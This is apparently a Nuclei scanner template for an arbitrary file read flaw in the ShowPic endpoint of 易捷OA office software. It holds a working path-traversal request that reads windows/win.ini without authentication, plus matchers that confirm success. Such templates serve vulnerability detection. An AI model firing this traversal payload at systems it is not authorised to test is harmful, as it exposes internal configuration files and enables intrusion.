script_name: 易捷OA ShowPic 存在任意文件读取
content:
id: yijie-OA-Arbitrary-file-read

info:
  name: 易捷OA ShowPic 存在任意文件读取
  author: luckying
  severity: medium
  description: 易捷OA协同办公软件 ShowPic 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- method: GET
  path:
  - '{{RootURL}}/servlet/ShowPic?filePath=../../windows/win.ini'
  headers:
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=4EC13A7A3B9CAD5171319BCE84A6E51A
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/118.0.0.0 Safari/537.36
    accept: '*/*'

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - "contains(body, 'for 16-bit app support')"
        - "contains(body, 'fonts')"
        - "contains(body, 'extensions')"
        - "status_code == 200"
      condition: and
